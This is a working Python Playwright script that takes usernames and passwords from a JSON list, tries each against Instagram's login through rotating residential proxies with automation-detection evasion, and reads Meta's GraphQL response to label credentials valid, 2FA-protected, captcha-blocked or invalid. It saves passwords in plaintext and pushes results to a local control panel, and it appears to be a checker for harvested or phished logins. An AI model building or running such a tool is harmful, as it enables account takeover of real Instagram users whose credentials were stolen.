import hashlib
import json
import os
import sys
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import Optional
from playwright.sync_api import sync_playwright

ENV_PATH = Path(".env")
if ENV_PATH.exists():
    try:
        for line in ENV_PATH.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                os.environ.setdefault(k.strip(), v.strip().strip("'\""))
    except Exception:
        pass


def obter_config_proxy(usuario: Optional[str] = None):
    server = os.getenv("PROXY_SERVER", "").strip()
    username = os.getenv("PROXY_USERNAME", "").strip()
    password = os.getenv("PROXY_PASSWORD", "").strip()
    proxy_url = os.getenv("PROXY_URL", "").strip()

    if proxy_url and not server:
        parsed = urllib.parse.urlparse(proxy_url)
        server = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
        username = parsed.username or ""
        password = parsed.password or ""

    if not server:
        return None

    user_final = username
    if usuario and "zone-" in username and "-session-" not in username:
        sess_hash = hashlib.md5(usuario.strip().lower().encode()).hexdigest()[:8]
        user_final = f"{username}-session-{sess_hash}"

    cfg = {"server": server}
    if user_final:
        cfg["username"] = user_final
    if password:
        cfg["password"] = password
    return cfg

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")
URL_LOGIN = "https://www.instagram.com/?flo=true"
API_RESULTADO_LOCAL = "http://localhost:5501/api/resultado-bot"

SELECTOR_USERNAME = "input[name='email'], input[name='username'], input[type='text']"
SELECTOR_PASSWORD = "input[name='pass'], input[name='password'], input[type='password']"
SELECTOR_SUBMIT = "div[role='button'][aria-label='Entrar'], div[role='button']:has-text('Entrar'), div[role='button']:has-text('Log in'), button[type='submit'], input[type='submit']"


def pegar_ultimo_login():
    if not DADOS_JSON.exists():
        print("[ERRO] dados.json não encontrado.")
        return None

    try:
        with open(DADOS_JSON, "r", encoding="utf-8-sig") as f:
            dados = json.load(f)
    except Exception as e:
        print(f"[ERRO] Falha ao ler dados.json: {e}")
        return None

    if not isinstance(dados, list):
        print("[ERRO] dados.json deve conter uma lista.")
        return None

    for item in reversed(dados):
        if isinstance(item, dict) and (item.get("usuario") or item.get("nome")) and item.get("senha"):
            return item

    print("[AVISO] Nenhum login com credenciais encontrado em dados.json.")
    return None


def carregar_logs():
    if not RESULTADO_JSON.exists():
        return []
    try:
        with open(RESULTADO_JSON, "r", encoding="utf-8-sig") as f:
            conteudo = json.load(f)
            if isinstance(conteudo, list):
                return conteudo
            if isinstance(conteudo, dict):
                return [conteudo]
    except Exception as e:
        print(f"[AVISO] Falha ao ler resultado.json: {e}")
    return []


def salvar_resultado(usuario, senha, valido, status_credencial, mensagem, url_final="", error_code=None):
    novo_log = {
        "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "valido": valido,
        "status_credencial": status_credencial,
        "nome": usuario,
        "usuario": usuario,
        "senha": senha,
        "mensagem": mensagem,
        "error_code": error_code,
        "url_final": url_final
    }

    logs = carregar_logs()
    logs.append(novo_log)

    try:
        with open(RESULTADO_JSON, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"[ERRO] Falha ao salvar resultado.json: {e}")

    # Notifica o server.js via API local para disparar SSE imediato ao painel
    try:
        payload_bytes = json.dumps({
            "usuario": usuario,
            "valido": valido,
            "status_credencial": status_credencial,
            "mensagem": mensagem
        }).encode("utf-8")
        req = urllib.request.Request(
            API_RESULTADO_LOCAL,
            data=payload_bytes,
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req, timeout=4)
        print(f"[NOTIFICAÇÃO] server.js notificado com sucesso ({status_credencial}).")
    except Exception as e:
        print(f"[AVISO] Falha ao notificar server.js: {e}")


def testar_login(usuario, senha):
    print()
    print("====================================")
    print("   INICIANDO VALIDAÇÃO INSTAGRAM")
    print("====================================")
    print("Usuário:", usuario)

    resultado_valido = False
    status_credencial = "invalido"
    msg_resultado = "Falha desconhecida na validação."
    error_code_detectado = None
    url_final = ""

    captured_graphql = {}

    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage"
            ]
        )
        proxy_cfg = obter_config_proxy(usuario)
        if proxy_cfg:
            print(f"[PROXY] Standalone bot roteado via Bright Data ({proxy_cfg.get('server')})...")
        context_kwargs = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 800},
            "locale": "pt-BR",
            "timezone_id": "America/Sao_Paulo"
        }
        if proxy_cfg:
            context_kwargs["proxy"] = proxy_cfg
        context = browser.new_context(**context_kwargs)
        page = context.new_page()

        def on_response(response):
            if "/api/graphql" in response.url and response.request.method == "POST":
                try:
                    body = response.json()
                    if isinstance(body, dict):
                        if "data" in body and isinstance(body["data"], dict):
                            if "caa_login_web" in body["data"]:
                                captured_graphql["caa_login_web"] = body["data"]["caa_login_web"]
                        if "errors" in body and body["errors"]:
                            captured_graphql["errors"] = body["errors"]
                except Exception:
                    pass

        page.on("response", on_response)

        try:
            print("[1] Carregando interface CAA Login...")
            page.goto(URL_LOGIN, wait_until="networkidle", timeout=30000)

            print("[2] Localizando campos de credenciais...")
            page.wait_for_selector(SELECTOR_USERNAME, state="attached", timeout=15000)
            page.wait_for_selector(SELECTOR_PASSWORD, state="attached", timeout=15000)

            print("[3] Preenchendo identificador...")
            usuario_input = usuario[1:].strip() if usuario.startswith("@") else usuario.strip()
            user_el = page.locator(SELECTOR_USERNAME).first
            pass_el = page.locator(SELECTOR_PASSWORD).first
            user_el.click()
            user_el.fill(usuario_input)

            print("[4] Preenchendo senha...")
            pass_el.click()
            pass_el.fill(senha)
            page.wait_for_timeout(300)

            print("[5] Submetendo autenticação...")
            btn_entrar = page.locator(SELECTOR_SUBMIT).first
            if btn_entrar.is_visible():
                btn_entrar.click()
            else:
                page.keyboard.press("Enter")

            print("[6] Interceptando resposta GraphQL da Meta...")
            for _ in range(40):  # até 12 segundos
                page.wait_for_timeout(300)
                if "caa_login_web" in captured_graphql or "errors" in captured_graphql:
                    break
                url_now = page.url
                if "two_factor" in url_now or "challenge" in url_now:
                    break

            url_final = page.url
            caa = captured_graphql.get("caa_login_web")
            errors = captured_graphql.get("errors")

            if errors:
                err = errors[0] if isinstance(errors, list) and len(errors) > 0 else {}
                err_code = err.get("code")
                err_msg = err.get("message", "Erro GraphQL na Meta")
                error_code_detectado = err_code
                if err_code == 1675004 or "rate limit" in str(err_msg).lower():
                    resultado_valido = False
                    status_credencial = "rate_limit"
                    msg_resultado = f"Limite de requisições excedido no Instagram (Rate limit 1675004): {err_msg}"
                elif "checkpoint" in str(err_msg).lower() or "challenge" in str(err_msg).lower():
                    resultado_valido = False
                    status_credencial = "bloqueio_captcha"
                    msg_resultado = f"Desafio de segurança da Meta acionado: {err_msg}"
                else:
                    resultado_valido = False
                    status_credencial = "bloqueio_meta"
                    msg_resultado = f"Resposta de restrição da Meta ({err_code}): {err_msg}"
            elif caa:
                error_code = caa.get("error_code")
                error_code_detectado = error_code
                error_msg = caa.get("error_message")
                err_text = ""
                if isinstance(error_msg, dict):
                    err_text = error_msg.get("text", "")

                two_factor = caa.get("two_factor_result")
                recaptcha = caa.get("recaptcha_needed") or caa.get("is_ig_login_recaptcha")
                authed = caa.get("ig_authenticated")

                if error_code == 1348009 or (error_code is not None and error_code != 0):
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = err_text or f"Senha incorreta (error_code: {error_code})"
                elif recaptcha:
                    resultado_valido = False
                    status_credencial = "bloqueio_captcha"
                    msg_resultado = "Desafio Captcha da Meta acionado"
                elif two_factor is not None:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "2FA Requerido - Etapa de código encontrada"
                elif authed is True:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Autenticação direta bem-sucedida"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = err_text or "Credencial não autenticada no Instagram"
            else:
                if "two_factor" in url_final or "challenge" in url_final:
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - rota de 2FA / desafio alcançada"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = "Login inválido ou etapa de código não encontrada"

            print(f"\n[VEREDITO] {usuario} -> {status_credencial.upper()} ({msg_resultado})")

            salvar_resultado(
                usuario=usuario,
                senha=senha,
                valido=resultado_valido,
                status_credencial=status_credencial,
                mensagem=msg_resultado,
                url_final=url_final,
                error_code=error_code_detectado
            )

            return resultado_valido

        except Exception as e:
            print(f"[ERRO] Exceção durante execução do bot: {e}")
            salvar_resultado(
                usuario=usuario,
                senha=senha,
                valido=False,
                status_credencial="invalido",
                mensagem=f"Erro no bot: {e}",
                url_final=page.url if 'page' in locals() else ""
            )
            return False

        finally:
            browser.close()


if __name__ == "__main__":
    if len(sys.argv) >= 3:
        u = sys.argv[1]
        s = sys.argv[2]
        testar_login(u, s)
    else:
        ultimo = pegar_ultimo_login()
        if ultimo:
            u = ultimo.get("usuario") or ultimo.get("nome")
            s = ultimo.get("senha")
            if u and s:
                testar_login(u, s)
            else:
                print("[ERRO] Credenciais inválidas no objeto do dados.json.")
        else:
            print("[INFO] Uso: python bot.py <usuario> <senha>")
